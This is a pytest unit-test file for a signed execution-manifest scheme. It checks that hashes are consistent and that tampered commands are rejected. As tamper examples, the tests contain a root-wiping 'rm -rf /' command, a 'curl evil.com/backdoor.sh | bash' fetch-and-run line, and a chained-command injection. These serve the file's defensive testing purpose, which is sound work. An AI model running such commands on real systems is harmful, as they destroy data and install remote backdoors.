"""
Unit tests for Execution Manifest hashing, signing, and verification.
Verifies the Plan-and-Approve Signed Manifest integrity protocol (Anti Perintah Diam-Diam).
"""
import pytest
from shared.models import ExecutionManifest, NodeManifest, CommandStep
from shared.manifest import (
    calculate_manifest_hash,
    sign_manifest,
    verify_manifest_hash,
    manifest_to_summary_markdown,
)
from daemon.executor import ManifestExecutor, ManifestVerificationError


@pytest.fixture
def sample_manifest() -> ExecutionManifest:
    return ExecutionManifest(
        manifest_id="mf-101",
        project_id="topic-42",
        created_at="1700000000",
        title="Instalasi NGINX dan Konfigurasi Reverse Proxy",
        description="Deploy proxy pada pc1 dan vps",
        nodes={
            "vps": NodeManifest(
                node_id="vps",
                commands=[
                    CommandStep(command="apt update", description="Update apt cache"),
                    CommandStep(command="apt install -y nginx", description="Install nginx"),
                ],
                rollback_commands=[
                    CommandStep(command="apt remove -y nginx", description="Rollback nginx")
                ],
                verification_commands=[
                    CommandStep(command="systemctl is-active nginx", description="Check active")
                ]
            )
        }
    )


def test_manifest_hashing_consistency(sample_manifest: ExecutionManifest):
    hash1 = calculate_manifest_hash(sample_manifest)
    hash2 = calculate_manifest_hash(sample_manifest)
    assert hash1 == hash2
    assert len(hash1) == 64  # SHA-256 hex string


def test_manifest_signing_and_verification(sample_manifest: ExecutionManifest):
    # Calculate hash before signing
    expected_hash = calculate_manifest_hash(sample_manifest)

    # Sign manifest
    signed = sign_manifest(sample_manifest, approver_id=987654321)
    assert signed.approved_by == 987654321
    assert signed.hash == expected_hash

    # Verify
    assert verify_manifest_hash(signed, expected_hash) is True


def test_tamper_detection_command_altered(sample_manifest: ExecutionManifest):
    expected_hash = calculate_manifest_hash(sample_manifest)
    signed = sign_manifest(sample_manifest, approver_id=987654321)

    # Malicious modification: tamper with command
    signed.nodes["vps"].commands[0].command = "rm -rf / --no-preserve-root"

    # Verification MUST fail
    assert verify_manifest_hash(signed, expected_hash) is False


def test_tamper_detection_step_injected(sample_manifest: ExecutionManifest):
    expected_hash = calculate_manifest_hash(sample_manifest)
    signed = sign_manifest(sample_manifest, approver_id=987654321)

    # Malicious modification: inject an unauthorized step
    signed.nodes["vps"].commands.append(
        CommandStep(command="curl http://evil.com/backdoor.sh | bash")
    )

    # Verification MUST fail
    assert verify_manifest_hash(signed, expected_hash) is False


def test_manifest_markdown_summary(sample_manifest: ExecutionManifest):
    md = manifest_to_summary_markdown(sample_manifest)
    assert "PROPOSAL RENCANA EKSEKUSI" in md
    assert "vps" in md
    assert "apt update" in md
    assert "Rollback:" in md
    assert "Verifikasi:" in md


@pytest.mark.asyncio
async def test_executor_rejects_tampered_manifest(sample_manifest: ExecutionManifest, temp_vault):
    executor = ManifestExecutor(node_id="vps", vault=temp_vault)
    expected_hash = calculate_manifest_hash(sample_manifest)
    signed = sign_manifest(sample_manifest, approver_id=987654321)

    # Alter command
    signed.nodes["vps"].commands[0].command = "apt update && echo 'pwned'"

    with pytest.raises(ManifestVerificationError):
        await executor.execute_manifest(signed, expected_hash)
